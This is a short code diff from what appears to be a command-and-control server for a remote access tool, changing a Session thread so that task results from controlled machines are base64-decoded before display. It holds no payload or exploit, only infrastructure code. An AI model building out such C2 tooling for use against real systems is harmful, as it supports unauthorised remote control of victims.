@@ -960,7 +960,7 @@ class Session(threading.Thread):
                             self.send_task(task)
                     elif 'result' in task:
                         if task.get('result') and task.get('result') != 'None':
-                            globals()['c2'].display(task.get('result').encode())
+                            globals()['c2'].display(base64.decodebytes(task.get('result').encode()).decode())
                             globals()['c2'].database.handle_task(task)
                 else:
                     if self._abort:
